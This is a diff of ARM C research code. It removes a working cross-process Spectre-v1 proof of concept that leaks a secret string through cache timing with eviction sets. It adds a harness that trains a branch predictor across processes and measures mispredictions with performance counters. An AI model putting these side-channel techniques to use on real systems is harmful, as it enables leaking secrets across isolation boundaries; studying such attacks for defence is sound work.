@@ -1,118 +1,88 @@
 
 
 #define _GNU_SOURCE
-#include <asm/unistd.h>
-#include <assert.h>
-#include <libflush.h>
+
 #include <linux/perf_event.h>
-#include <pthread.h>
-#include <sched.h>
 #include <stdint.h>
 #include <stdio.h>
+#include <stdlib.h>
 #include <string.h>
 #include <sys/mman.h>
-#include <sys/syscall.h>
-#include <time.h>
-#include <unistd.h>
+#include <pthread.h>
+#include <signal.h>
 
+asm(".include \"monitor.S\"");
 
+signed int *exp_sign;
 
-
-#ifndef CHASE
-#define CHASE ".rept 4\n"
-#endif
-
-#define PAGESIZE 4096
-
-#ifndef L1_ASSOC
-#define L1_ASSOC 4
-#endif
-
-#ifndef LINE_SIZE
-#define LINE_SIZE 32
-#endif
-
-#ifndef L1_SET
-#define L1_SET 256
-#endif
-
-#ifndef L2_SET
-#define L2_SET 2048
-#endif
-
-#ifndef L2_ASSOC
-#define L2_ASSOC 8
-#endif
-
-
-
-
-#define TIMING_LIBFLUSH
-libflush_session_t* libflush_session;
-
-
-#define KB (1024)
-#define MB (1024 * KB)
-#define BUFFER_SIZE (32 * MB)
-#define ENTRY_SIZE (8)
-#define CACHE_LINE (32)
-
-#define PROTECTION (PROT_EXEC | PROT_READ | PROT_WRITE)
-#define PROTECTION2 (PROT_READ | PROT_WRITE)
-#define FLAGS (MAP_PRIVATE | MAP_ANONYMOUS)
-#define PROBE_OFFSET (2048)
-
-
-typedef void *vaddr;
-typedef void *paddr;
-
-
-volatile unsigned int* syncer;
-
-char* buffer;
-
-
-int MAX_TRIES = 999;
-unsigned int CACHE_HIT_THRESHOLD = 100;
-
-/********************************************************************
-Victim code.
-********************************************************************/
-
-uint8_t unused1[64];
-uint8_t array1[160] = {1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16};
-
-//uint8_t unused2[32*9] = {1};
-uint8_t unused2[64];
-uint8_t* array2; // [256 * PROBE_OFFSET];
-unsigned int array1_size = 16;
-
-unsigned int *array1_size_ptr;
-
-int** array1_size_mm;
-uint8_t unused3[32*6] = {1};
-
-char* secret = "\x01\x01\x00\x00\x00\x00\x01\x00  The Magic Words are Squeamish Ossifrage.";
-uint8_t temp = 0; /* Used so compiler won't optimize out victim_function() */
-uint32_t temp2 = 0;
-
-static inline uint64_t read_cycles(void){
-	uint32_t r = 0;
-	asm volatile("mrc p15, 0, %0, c9, c13, 0" : "=r"(r) );
-	return r;
+static inline uint32_t _read_cpu_counter(int r) {
+  // Read PMXEVCNTR #r
+  // This is done by first writing the counter number to PMSELR and then reading PMXEVCNTR
+  uint32_t ret;
+  asm volatile ("MCR p15, 0, %0, c9, c12, 5\t\n" :: "r"(r));      // Select event counter in PMSELR
+  asm volatile ("MRC p15, 0, %0, c9, c13, 2\t\n" : "=r"(ret));    // Read from PMXEVCNTR
+  return ret;
 }
 
-
-static inline write_pmselr_counter(void){
-	asm volatile("mcr p15, 0, %0, c9, c12, 1" :: "r"(0x8000000f));
+// Very simple , switch to secure world api 
+static inline void _secure_world_switch()
+{
+  printf(" 	asm volatile(CPS     0x16); \n");
+  asm volatile("CPS     0x16");  // Change the processor state to MONITOR mode .
+  uint32_t scr_reg_value = 0x0;  
+  printf(" 	asm volatile(MRC     p15, 0, %0, c1, c1, 0); \n");
+  asm volatile("MRC     p15, 0, %0, c1, c1, 0" : "=r"(scr_reg_value));    
 }
 
-static inline uint64_t read_pmselr_counter(void){
-	uint32_t r = 0;
-	asm volatile("mrc p15, 0, %0, c9, c12, 5" : "=r"(r) );
-	return r;
+static inline void _setup_cpu_counter(uint32_t r, uint32_t event, const char* name) {
+	//  cpu_name[r] = name;
+
+  // Write PMXEVTYPER #r
+  // This is done by first writing the counter number to PMSELR and then writing PMXEVTYPER
+  asm volatile ("MCR p15, 0, %0, c9, c12, 5\t\n" :: "r"(r));        // Select event counter in PMSELR
+  asm volatile ("MCR p15, 0, %0, c9, c13, 1\t\n" :: "r"(event));    // Set the event number in PMXEVTYPER
 }
 
+static void init_cpu_perf() {
+
+  // Disable all counters for configuration (PCMCNTENCLR)
+  asm volatile ("MCR p15, 0, %0, c9, c12, 2\t\n" :: "r"(0x8000003f));
+
+  // disable counter overflow interrupts
+  // asm volatile ("MCR p15, 0, %0, c9, c14, 2\n\t" :: "r"(0x8000003f));
+
+
+  // Select which events to count in the 6 configurable counters
+  // All of these events come from the list of required events.
+
+//  _setup_cpu_counter(0, 0x00, "SW_INC");
+//  _setup_cpu_counter(1, 0x03, "L1DFILL");
+//  _setup_cpu_counter(2, 0x04, "L1DACC");
+  _setup_cpu_counter(1, 0x10, "BR_MIS_PRED");
+//  _setup_cpu_counter(4, 0x11, "CYCLE");
+  _setup_cpu_counter(0, 0x12, "SP_EXEC");
+
+}
+
+static inline void reset_cpu_perf() {
+  // Disable all counters (PMCNTENCLR):
+  asm volatile ("MCR p15, 0, %0, c9, c12, 2\t\n" :: "r"(0x8000003f));
+
+  uint32_t pmcr  = 0x1    // enable counters
+            | 0x2    // reset all other counters
+            | 0x4    // reset cycle counter
+//            | 0x8    // enable "by 64" divider for CCNT.
+            | 0x10;  // Export events to external monitoring
+
+  // program the performance-counter control-register (PMCR):
+  asm volatile ("MCR p15, 0, %0, c9, c12, 0\t\n" :: "r"(pmcr));
+
+  // clear overflows (PMOVSR):
+    asm volatile ("MCR p15, 0, %0, c9, c12, 3\t\n" :: "r"(0x8000003f));
+
+  // Enable all counters (PMCNTENSET):
+  asm volatile ("MCR p15, 0, %0, c9, c12, 1\t\n" :: "r"(0x8000003f));
+}
 
 static inline uint64_t read_perf_counter(void){
 	uint32_t r = 0;
@@ -120,341 +90,125 @@ static inline uint64_t read_perf_counter(void){
 	return r;
 }
 
-
-
 static inline void barriers(void){
 	__asm__ __volatile__ ("dsb sy"  : : : "memory");
 }
 
-static inline __attribute__((optimize("-O1"))) uint64_t get_time(void){
-	uint64_t timer;
-
-	barriers();
-	timer = read_cycles();
-	barriers();
-
-	return timer;
+static inline void ins_barriers(void){
+	__asm__ __volatile__ ("isb" : : : "memory");
 }
 
-
-static inline void memaccess(vaddr addr)
-{
-  volatile uint32_t value;
-  asm volatile ("LDR %0, [%1]\n\t"
-      : "=r" (value)
-      : "r" (addr)
-      );
+static inline void dmb_barriers(void){
+	__asm__ __volatile__ ("dmb" : : : "memory");
 }
 
+static uint32_t get_mispred(void){
+	uint32_t r;
 
-static void __attribute__((optimize("-O1"))) victim_function(size_t x)
-{
-	if (x < *array1_size_ptr)
-	{
-		temp += array2[array1[x] * PROBE_OFFSET];
-	}
-	temp += 3;
+	ins_barriers();
+	dmb_barriers();
+
+	r = _read_cpu_counter(1);
+
+
+	ins_barriers();
+	dmb_barriers();
+	return r;
 }
 
+static uint32_t get_pred(void){
+	uint32_t r;
 
+	ins_barriers();
+	dmb_barriers();
 
-int get_L1_cache_set(vaddr addr){
-	paddr p_addr = libflush_get_physical_address(libflush_session, addr);
-	return ((int)p_addr >> 5) & 0xff;
+	r = _read_cpu_counter(0);
+
+	ins_barriers();
+	dmb_barriers();
+	return r;
 }
 
-int get_L2_cache_set(vaddr addr){
-	paddr p_addr = libflush_get_physical_address(libflush_session, addr);
-	return ((int)p_addr >> 5) & 0x7ff;
-}
-
-
-static void * allocate_aligned(size_t size, size_t alignment)
-{
-
-	const size_t mask = alignment - 1;
-	const uintptr_t mem = (uintptr_t) malloc(size + alignment);
-	return (void *) ((mem + mask) & ~mask);
-
-}
-
-
-static void _swap(void** a, void** b)
-{
-  void* tmp = *a;
-  *a = *b;
-  *b = tmp;
-}
-
-static void _shuffle(void**arr, size_t n)
-{
-  int i, j;
-  for(i = n - 1; i > 0; i--) {
-    j = rand() % (i+1);
-    _swap(arr+i, arr+j);
-  }
-}
-
-static inline void _chase(char** b)
-{
-  asm volatile(
-    "LDR r5, [%0] \n\t"
-    ".rept 100\n\t"
-    "LDR r5, [r5]\n\t"
-    ".endr\n"
-    :: "r" (b)
-	: "cc", "r5"
-  );
-}
-
-
-static inline void _chase_L2(char** b)
-{
-	_chase(b);
-	_chase(b+1);
-	_chase(b);
-	_chase(b+1);
-
-
-}
-
-static inline uint32_t _chase_time(char** b)
-{
-  uint64_t t1 = get_time();
-  asm volatile(
-    "LDR r5, [%0] \n\t"
-    ".rept 3\n\t"
-    "LDR r5, [r5]\n\t"
-    ".endr\n"
-    :: "r" (b)
-	: "cc", "r5"
-  );
-  return get_time() - t1;
-}
-
-static inline uint32_t _chase_time_L2(char** b)
-{
-  uint64_t t1 = get_time();
-  asm volatile(
-    "LDR r5, [%0] \n\t"
-    ".rept 8\n\t"
-    "LDR r5, [r5]\n\t"
-    ".endr\n"
-    :: "r" (b)
-	: "cc", "r5"
-  );
-  return get_time() - t1;
-}
-
-
-
-static void _print_pointer_chaser(char** b, size_t n)
-{
-  int i;
-  _chase(b);
-  b = *(b + 1);
-  _chase(b);
-}
-
-
-static char** pointer_chasing(char**arr, size_t n)
-{
-  int i;
-  // forward pointer
-  for (i = 1; i < n; i++){
-    *(char**)(*(arr+i-1)) = *(arr+i);
-  }
-  *(char**)(*(arr+i-1)) = *arr;
-
-  // backward pointer
-  for (i = n - 2; i >= 0; i--){
-    *((char**)*(arr+i+1) + 1) = (char**)*(arr+i) + 1;
-  }
-  *((char**)*(arr+i+1) + 1) = (char**)*(arr+n-1) + 1;
-
-  return (char**)*arr;
-}
-
-
-
-static char** create_et(void* p, size_t n, int target_set_idx)
-{
-  char** et = malloc(sizeof(void*)*n);
-
-  int i;
-  for(i = 0; i < n; i++){
-    *(et+i) = p + target_set_idx * LINE_SIZE + (i*L1_SET*LINE_SIZE);
-  }
-
-  _shuffle((void**)et, n);
-
-  char** r = pointer_chasing(et, n);
-  free(et);
-  return r;
-}
-
-
-static char** create_et_L2(void* p, size_t n, int target_set_idx)
-{
-  char** et = malloc(sizeof(void*)*n);
-
-  int i;
-  for(i = 0; i < n; i++){
-    *(et+i) = p + target_set_idx * LINE_SIZE + (i*L2_SET*LINE_SIZE);
-    printf("Set Index: %d\n", get_L2_cache_set(*(et+i)));
-  }
-
-  _shuffle((void**)et, n);
-
-  char** r = pointer_chasing(et, n);
-  free(et);
-  return r;
-}
-
-
-static char* _victim(void* p, int target_set_idx)
-{
-  return p + target_set_idx * LINE_SIZE + (70*L1_SET*LINE_SIZE);
-}
-
-
-void print_hist(int* hist, int total, const char* title){
-
+void print_hist(int* hist, int total, const char* title) {
 	for(int i = 0; i < total; i++)
 		printf("%s %i\n", title, hist[i]);
 }
 
+uint32_t mispred_rev[10000];
+uint32_t    pred_rev[10000];
 
+uint32_t mispred_1;
+uint32_t mispred_2;
 
-void notify_victim() {
-    *syncer = 1;
-    barriers();
-    sched_yield();
+uint32_t pred_1;
+uint32_t pred_2;
 
-}
-
-void wait_victim() {
-    while (*syncer != 0){
-    	sched_yield();
-    }
-}
-
-void notify_spy() {
-    *syncer = 0;
-    //barriers();
-    sched_yield();
-
-}
-
-void wait_spy() {
-    while (*syncer != 1){
-    	sched_yield();
-    }
-}
-
-
-static inline size_t clean_GHB(size_t malicious_x){
-	  asm volatile(
-		"cmp %0, #100\n\t"
-		".rept 50000\n\t"
-		"bxls lr\n\t"
-	    "add %0, %0, #1\n\t"
-		".endr\n\t"
-		:: "r" (malicious_x)
-		: "cc", "r5"
-	  );
-	  return malicious_x;
-}
-
-
-static inline void reconstruct_GHR(){
-	  int a;
-	  volatile int b = 20000;
-	  for(int i = 0, a = 0; i< 50; i++){
-		if(a < b)
-			a++;
-	  }
-	  barriers();
-}
-
-
-int hist_0[1000];
-int hist_1[1000];
-int bit_no = 0;
-int bits[8];
-/* Report best guess in value[0] and runner-up in value[1] */
-void __attribute__((optimize("-O1"))) readMemoryByte(uint8_t value[2], int score[2], char** r_0, char** r_1,  char** r_branch) //__attribute__((optimize("-O2")))
-{
-	size_t malicious_x = (size_t)(secret - (char *)array1); /* default for malicious_x */
-	static int results[256];
-	volatile int tries, i, j, k, z, low, high = 10000;
-	unsigned int junk = 0;
-	size_t training_x, x;
-	register uint64_t timer1, timer2;
-	volatile char t;
-	int index_hist = 0;
-
-	for (i = 0; i < 256; i++){
-		results[i] = 0;
+int* dummmmy;
+int array[1024];
+int dummy_index = 0;
+int multiplyOrNot(signed char e, int a){
+	if ((signed char)e < 0){ // *exp_sign
+		a *= 37;
+		*dummmmy += 13;
+		array[(dummy_index++)%1024] = *dummmmy;
 	}
+	*dummmmy -= 11;
 
-	for (tries = MAX_TRIES; tries > 0; tries--)
-	{
-
-		_chase_L2(r_0);
-		barriers();
-		training_x = tries % array1_size; //  array1_size
-
-		for (j = 9; j >= 1; j--)
-		{
-			_chase_L2(r_branch);
-			barriers();
-
-			x = ((j % 10) - 1) & ~0xFFFF; /* Set x=FFF.FF0000 if j%9==0, else x=0 */
-			x = (x | (x >> 16)); /* Set x=-1 if j%6=0, else x=0 */
-			x = training_x ^ (x & (malicious_x ^ training_x));
-
-			victim_function(x);
-		}
-
-
-
-		_chase_L2(r_branch);
-		barriers();
-		for (volatile int z = 0; z < 1000; z++){} // soft barrier
-		_chase_L2(r_0);
-		barriers();
-		for (volatile int z = 0; z < 1000; z++){} // soft barrier
-
-
-		notify_victim(syncer);
-		// Victim is running here
-		wait_victim(syncer);
-
-
-		/*Timing of the bit value*/
-		timer1 = get_time();
-		memaccess(&array2[0 * PROBE_OFFSET]);
-		timer2 = get_time();
-		hist_0[index_hist] = timer2 - timer1;
-
-		index_hist++;
-
-	}
-
-	/*Evaluation of the bit value*/
-	barriers();
-	for(int tries = 0; tries < MAX_TRIES; tries++ ){
-		if(hist_0[tries] < 80){
-			bits[bit_no]++;
-		}
-	}
-
-	bit_no++;
-
+	return a;
 
 }
 
+void trainVulnBranch_n(){ /* n of them will be run below */
+	signed int e = -1;
+	int a = 2;
+
+	multiplyOrNot(e,a); //1
+	multiplyOrNot(e,a); //2
+	multiplyOrNot(e,a); //3
+	multiplyOrNot(e,a); //4
+	multiplyOrNot(e,a); //5
+	multiplyOrNot(e,a); //6
+	multiplyOrNot(e,a); //7
+	multiplyOrNot(e,a); //8
+//	multiplyOrNot(e,a); //9
+//	multiplyOrNot(e,a); //10
+//	multiplyOrNot(e,a); //11
+//	multiplyOrNot(e,a); //12
+//	multiplyOrNot(e,a); //13
+//	multiplyOrNot(e,a); //14
+//	multiplyOrNot(e,a); //15
+//	multiplyOrNot(e,a); //16
+
+}
+
+void trainVulnBranch_n4(){ /* n+4 of them will be run below*/
+	signed int e = -1;
+	int a = 2;
+
+	multiplyOrNot(e,a); //1
+	multiplyOrNot(e,a); //2
+	multiplyOrNot(e,a); //3
+	multiplyOrNot(e,a); //4
+	multiplyOrNot(e,a); //5
+	multiplyOrNot(e,a); //6
+	multiplyOrNot(e,a); //7
+	multiplyOrNot(e,a); //8
+	multiplyOrNot(e,a); //9
+	multiplyOrNot(e,a); //10
+	multiplyOrNot(e,a); //11
+	multiplyOrNot(e,a); //12
+//	multiplyOrNot(e,a); //13
+//	multiplyOrNot(e,a); //14
+//	multiplyOrNot(e,a); //15
+//	multiplyOrNot(e,a); //16
+//	multiplyOrNot(e,a); //17
+//	multiplyOrNot(e,a); //18
+//	multiplyOrNot(e,a); //19
+//	multiplyOrNot(e,a); //20
+
+}
+
+int cpu = 0;
 
 void setcpuaffinity(int cpu) {
     cpu_set_t cs;
@@ -467,143 +221,182 @@ void setcpuaffinity(int cpu) {
 }
 
 
-void victim_process(int cpu){
+int eData = 100;
 
-	setcpuaffinity(cpu);
+static inline void resultProcess(int try)
+{
+  int a=2;
+  int mispred_1_l = get_mispred();
+  int pred_1_l    = get_pred();
 
-	if (libflush_init(&libflush_session, NULL) == false) {
-	  printf("Error: Could not initialize libflush\n");
-	  return -1;
-	}
-
-	paddr p_ofarray2 = libflush_get_physical_address(libflush_session, &array2[0 * PROBE_OFFSET]);
-	paddr p_of_array1_size= libflush_get_physical_address(libflush_session, array1_size_ptr);
-
-
-	printf("%p\n", p_ofarray2);
-	printf("%p\n------------\n", p_of_array1_size);
-
-
-	size_t malicious_x = (size_t)(secret - (char *)array1); /* default for malicious_x */
-
-	int repeat = 8*999;
-
-	while(repeat--){
-
-		wait_spy(syncer);
-		victim_function(malicious_x);
-		notify_spy(syncer);
-
-
-		if(repeat % 999 == 0){
-			malicious_x++;
-		}
-	}
-
-	if (libflush_terminate(libflush_session) == false) {
-	  printf("Libflush terminate failed\n");
-	  return -1;
-	}
-
-	exit(0);
+  multiplyOrNot(eData, a); // taken
+  int mispred_2_l = get_mispred();
+  int pred_2_l    = get_pred();
+  mispred_rev[try] = mispred_2_l - mispred_1_l;
+  pred_rev[try] = pred_2_l - pred_1_l;
 }
 
-void spy_process(int cpu){
-
-	setcpuaffinity(cpu);
-
-	int score[2];
-	int len = 8;
-	uint8_t value[2];
-
-
-
-	if (libflush_init(&libflush_session, NULL) == false) {
-	  printf("Error: Could not initialize libflush\n");
-	  return -1;
-	}
-
-
-	paddr p_ofarray2 = libflush_get_physical_address(libflush_session, &array2[0 * PROBE_OFFSET]);
-	paddr p_of_array1_size= libflush_get_physical_address(libflush_session, array1_size_ptr);
-
-
-
-	printf("MAX_TRIES=%d CACHE_HIT_THRESHOLD=%d len=%d\n", MAX_TRIES, CACHE_HIT_THRESHOLD, len);
-
-
-
-
-	size_t sz = 256 * PAGESIZE;
-	void *p = allocate_aligned(sz, PAGESIZE);
-	memset(p, 0, sz);
-	int p_L2_set = get_L2_cache_set(p);
-
-
-	while(p_L2_set != 0){
-		p += PAGESIZE;
-		p_L2_set = get_L2_cache_set(p);
-	}
-
-
-	/* Get the set indexes*/
-	int set_idx_0 = get_L2_cache_set(&array2[0 * PROBE_OFFSET]);
-	int set_idx_1 = get_L1_cache_set(&array2[1 * PROBE_OFFSET]);
-
-//	 int set_array1_size = get_L2_cache_set(&array1_size);
-	int set_array1_size = get_L2_cache_set(array1_size_ptr);
-
-	/* Get the chaser pointers*/
-	char** r_0 = create_et_L2(p, 8, set_idx_0);
-	printf("\n");
-	char** r_1 = create_et(p, L1_ASSOC, set_idx_1);
-	printf("\n");
-	char** r_branch = create_et_L2(p, 8, set_array1_size);
-
-
-
-	printf("\nReading %d bytes:\n", len);
-	while (--len >= 0) {
-//		printf("Reading at malicious_x = %p... ", (void*) malicious_x);
-		readMemoryByte(value, score, r_0, r_1, r_branch);
-		printf("Bit %d %s: %d", (7-len) , (score[0] >= 2 * score[1] ? "Success" : "Unclear"), (bits[(7-len)] > 80 ? 0 : 1));
-		if (score[1] > 0)
-			printf("(second best: 0x%02X score=%d)", value[1], score[1]);
-		printf("\n");
-	}
-
-	if (libflush_terminate(libflush_session) == false) {
-	  printf("Libflush terminate failed\n");
-	  return -1;
-	}
+static inline void trainProcess(int try)
+{
+  int a = 2;
+/*1*/ trainVulnBranch_n4(); // non taken
+  barriers();
+  ins_barriers();
+  dmb_barriers();
+/*2*/ multiplyOrNot(1, a); // taken
+  barriers();
+  ins_barriers();
+  dmb_barriers();
+/*3*/ trainVulnBranch_n(); // non taken
+  barriers();
+  ins_barriers();
+  dmb_barriers();
+/*4*/ multiplyOrNot(1, a); // taken
+  barriers();
+  ins_barriers();
+  dmb_barriers();
+/*5*/ trainVulnBranch_n(); // non taken
+  barriers();
+  ins_barriers();
+  dmb_barriers();
 
 }
 
+#define PROCESS_FORK
+
+void ReverseEng(int try){
+
+#ifdef PROCESS_FORK
+	pid_t pid = fork();
+	if(pid == 0)
+	{
+	  printf(" Cross Process Training e \n");
+#endif
+	  setcpuaffinity(cpu);
+      trainProcess(try);
+#ifdef PROCESS_FORK
+	  exit(0);
+	}
+	else
+	{
+	  // CheckPoint
+	  wait(0);
+	  resultProcess(try);
+      //_secure_world_switch();
+#endif
+	  setcpuaffinity(cpu);
+      resultProcess(try);
+
+#ifdef PROCESS_FORK
+	}
+#endif
+}
+
+int mispred[1000];
+int bit_no = 0;
+int bits[8];
+
+
+void printText()
+{
+  for(int i=0;i<1;i++)
+  {
+    printf("%s \r\t","VV----------------");
+    printf("%s \r\t","VV----------------");
+    printf("%s \r\t","VV----------------");
+    printf("%s \r\t","VV----------------");
+    printf("%s \r\t","VV----------------");
+  }
+}
+
+
+#define PAGE_SIZE 0x2000
+
+
+static inline void* alloc_page(void* function_ptr , int bitmask)
+{
+    int addr = (int)function_ptr & bitmask;
+    void* page_ptr = mmap((void*)addr, 4096, PROT_READ | PROT_WRITE, MAP_SHARED | MAP_ANONYMOUS, -1, 0);
+	printf(" alloc_page :: addr : %x , function_ptr : %p , bitmask : %x , page_ptr : %p \n " , addr , function_ptr , bitmask , page_ptr);
+    return page_ptr;
+}
+
+static inline void* find_function_address_page(void* function_ptr , int bitmask , void* page_ptr)
+{
+    int page_base_addr = (int)page_ptr;
+    int page_top_addr  = page_base_addr + PAGE_SIZE;
+    int function_ptr_bmsk_val = (int)function_ptr & bitmask;
+
+    for(int i=page_base_addr;i<page_top_addr;i++)
+    {
+      int bitmask_value = i & bitmask;
+      if(bitmask_value == function_ptr_bmsk_val)
+      {
+    	printf(" find_function_address_page : page_addr : %x , bmsk_val : %x , function_ptr_bmsk_val : %x \n" , i , bitmask_value , function_ptr_bmsk_val);
+        return (void*)i;
+      }
+    }
+
+    return NULL;
+}
+
+// Function size is 132 bytes , it is scaled by 3
+#define BUMP_UP_FUNC_SIZE 1024
+
+void copy_function_data(void * dest , void * src , int size_in_bytes)
+{
+  memcpy(dest,src,size_in_bytes);
+  printf(" copy_function_data :: dest : %p , src : %p , size_in_bytes : %d \n" , dest , src , size_in_bytes);
+
+}
 
 int main(int argc, char **argv)
 {
 
     /*Shared Memeories*/
-    syncer = mmap(NULL, sizeof(*syncer), PROT_READ | PROT_WRITE, MAP_SHARED | MAP_ANONYMOUS, -1, 0);
-    array2 = mmap(NULL, 256*PROBE_OFFSET, PROT_READ | PROT_WRITE, MAP_SHARED | MAP_ANONYMOUS, -1, 0);
-    array1_size_ptr = mmap(NULL, sizeof(*array1_size_ptr), PROT_READ | PROT_WRITE, MAP_SHARED | MAP_ANONYMOUS, -1, 0);
+    exp_sign = mmap(NULL, sizeof(*exp_sign), PROT_READ | PROT_WRITE, MAP_SHARED | MAP_ANONYMOUS, -1, 0);
+    *exp_sign = 0;
 
-    *array1_size_ptr = 16;
+    init_cpu_perf();
+    reset_cpu_perf();
 
-	for (size_t i = 0; i <  (256 * PROBE_OFFSET); i+= PROBE_OFFSET)
-		array2[i] = 1; /* write to array2 so in RAM not copy-on-write zero pages */
+    void * function_page_ptr = find_function_address_page(&multiplyOrNot , 0xfff,alloc_page(&multiplyOrNot , 0xfff));
+    copy_function_data(function_page_ptr , &multiplyOrNot , BUMP_UP_FUNC_SIZE);
+    void (*func_ptr)(signed char,int) = &multiplyOrNot;
+    //func_ptr(-1,2);
+    printf(" Function pointer works ! \n ");
 
-	pid_t pid = fork();
-	if(pid == 0){
-		victim_process(1);
-	}
-	else
-	{
-		spy_process(1);
-	}
+    dummmmy = (int*)malloc(sizeof(int));
+    *dummmmy = 5;
 
-	printf("\n--DONE--\n");
-	return (0);
+
+    for (int i=0; i<1000; i++)
+    {
+      printText();
+      ReverseEng(i);
+    }
+
+    printf("\n");
+
+    int num_mis_preds = 0;
+    int num_preds     = 0;
+
+    for(int i=0; i<1000; i++)
+    {
+      printf("(%d , %d) ", mispred_rev[i] , pred_rev[i]);
+      if(mispred_rev[i] == 1)
+      {
+        num_mis_preds++;
+      }
+      num_preds++;
+    }
+
+    printf(" \n");
+
+    printf("stats , num_mis_preds : %d ,  num_preds : %d " , num_mis_preds , num_preds);
+    printf("\n--DONE--\n");
+
+    return (0);
 
 }
 
